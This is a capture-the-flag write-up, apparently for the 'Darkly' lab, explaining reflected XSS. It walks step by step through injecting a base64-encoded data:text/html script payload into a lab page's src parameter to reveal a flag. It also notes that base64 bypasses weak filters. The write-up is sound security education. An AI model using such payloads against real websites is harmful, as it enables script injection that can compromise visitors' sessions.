# Reflected XSS (Cross-Site Scripting)

## Definition

Reflected XSS is a vulnerability where malicious JavaScript code is injected via a URL parameter, reflected immediately in the server response, and executed in the victim's browser.

Unlike Stored XSS, the payload is **not saved** in the database — it executes only once when the crafted URL is visited.

---

## Difference Between Reflected and Stored XSS

| Type | Behavior |
|---|---|
| **Reflected XSS** | Payload is in the URL and executes **once** when the victim visits the crafted link |
| **Stored XSS** | Payload is stored in the database and executes for **every visitor** |

---

## How It Works

A vulnerable application takes a URL parameter and includes it directly in the page response without validation or encoding.

By injecting a `data:text/html;base64` payload into the parameter, the browser decodes and executes the embedded JavaScript.

---

## What is `data:` ?

`data:` is a URL scheme that allows content to be embedded directly inside a URL instead of pointing to an external file.

### Example

```text
http://site.com/image.png
```

→ Points to an external file

```text
data:text/html;base64,...
```

→ Contains the file directly inside the URL

---

## Breakdown of the Payload URL

```text
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
│        │          │                    │
│        │          │                    └─ Base64 encoded content
│        │          └─ Encoding method
│        └─ Content type (HTML page)
└─ URL scheme
```

---

## Why Base64?

Without Base64, special characters like `<`, `>`, and `()` may be blocked or misinterpreted in URLs.

With Base64, the payload becomes a safe string composed only of letters, numbers, `+`, `/`, and `=`.

---

# Exploitation on Darkly

## Vulnerable Page

```text
http://10.11.200.188/?page=media&src=nsa
```

The `src` parameter loads content directly into the page without validation.

---

## Steps

### 1. Write the JavaScript Payload

```html
<script>alert(1)</script>
```

---

### 2. Encode It in Base64

```bash
echo -n '<script>alert(1)</script>' | base64
```

### Result

```text
PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

---

### 3. Build the Malicious URL

```text
http://10.11.200.188/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

---

### 4. Execute the Payload

Paste the URL into the browser and press Enter.

The JavaScript executes and the flag is displayed.

---

# What Happens Step by Step

1. The `src` parameter receives:

```text
data:text/html;base64,...
```

2. The server reflects it directly into the page without validation.

3. The browser detects:

```text
data:text/html
```

and interprets it as embedded HTML content.

4. The browser decodes the Base64 payload:

```text
PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

becomes:

```html
<script>alert(1)</script>
```

5. The JavaScript executes.

---

# Why It Is Vulnerable

The application is vulnerable because:

- User input is reflected directly into the page
- No validation is performed on the `src` parameter
- No output encoding is applied
- The `data:` scheme allows arbitrary HTML/JavaScript injection
- Base64 encoding bypasses weak filters

---

# References

OWASP XSS  
CWE-79
OWASP XSS Prevention Cheat Sheet 